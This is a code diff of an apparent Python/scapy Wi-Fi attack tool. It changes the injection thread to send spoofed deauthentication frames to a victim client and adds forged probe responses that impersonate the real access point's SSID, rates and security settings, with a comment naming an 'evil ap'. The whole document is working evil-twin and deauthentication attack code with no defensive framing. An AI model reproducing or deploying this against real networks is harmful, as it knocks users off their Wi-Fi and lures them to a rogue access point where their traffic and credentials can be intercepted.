@@ -5,10 +5,12 @@
 1. set the adapter to monitor mode
 2. sending disas packets
 """
-from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt, Dot11Disas, RadioTap,Dot11Deauth, sendp
+from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt, Dot11Disas, RadioTap,Dot11Deauth, sendp, Dot11ProbeResp
 import time
 import subprocess
 import sys
+import os
+from contextlib import redirect_stdout, redirect_stderr
 
 def set_injector_adapter(interface_name, channel):
     print(f"[*] Setting {interface_name} to act as Injector...")
@@ -31,21 +33,43 @@ def set_injector_adapter(interface_name, channel):
 def send_disas_packets(interface_name, victim, ap, stop_injection):
     victim_addr = victim['bssid']
     bssid = ap['bssid']
-    dot11_layer = Dot11(addr1=victim_addr, addr2=bssid, addr3=bssid, FCfield=2)
-    disas_layer = Dot11Disas(reason=7)
-    #deauth_layer = Dot11Deauth(reason=7)
-    dis_packet = RadioTap() / dot11_layer / disas_layer
-    #deauth_packet = RadioTap() / dot11_layer / deauth_layer
+    ssid = ap['ssid']
+    rates = b"\x82\x84\x8b\x96" if ap['rates'] == "Unknown" else ap['rates']
+    dot11_layer = Dot11(addr1=victim_addr, addr2=bssid, addr3=bssid)
+    dot11_layer_prob = Dot11(type=0, subtype=5, addr1=victim_addr, addr2=bssid, addr3=bssid)
+    #disas_layer = Dot11Disas(reason=7)
+    #dis_packet = RadioTap() / dot11_layer / disas_layer
+    deauth_layer = Dot11Deauth(reason=7)
+    deauth_packet = RadioTap() / dot11_layer / deauth_layer
+
+    probe_resp_fixed = Dot11ProbeResp(timestamp=0,beacon_interval=100,cap="ESS")
+
+    rates = b"\x82\x84\x8b\x96" if ap['rates'] == "Unknown" else ap['rates']
+    probe_response = (
+    RadioTap() / 
+    dot11_layer_prob / 
+    probe_resp_fixed / 
+    Dot11Elt(ID=0, info=ssid) / 
+    Dot11Elt(ID=1, info=rates)
+    )
+    # ID = SSID = 0, ID=1=rates, ID=50 es rates, 48 =security
+    if ap['esrates']:
+        probe_response /= Dot11Elt(ID=50, info=ap['esrates'])
+    probe_response /= Dot11Elt(ID=48, info=ap['security'])
+
     
     print("[*] Started sending disassociation and deauthentication packets in the background ")
     while not stop_injection.is_set():
         try:
-            sendp(dis_packet, iface=interface_name, count=10,inter=0.1, verbose=False)
-            #sendp(deauth_packet, iface=interface_name, count=10,inter=0.1, verbose=False)
+            #sendp(dis_packet, iface=interface_name, count=10,inter=0.1, verbose=False)
+            sendp(deauth_packet, iface=interface_name, verbose=False)
         # add option for injection thread to end when client already connected to evil ap
+            time.sleep(5)
+            sendp(probe_response, iface=interface_name, verbose=False)
 
         except Exception as e:
-            print("[!] Failed to sent Disas/Deauth packets due to {e}")
+            print(f"[!] Failed to sent Disas/Deauth packets due to {e}")
         if stop_injection.wait(0.2):
             break    
     print("[*] Injection thread cleanly stopped")
+
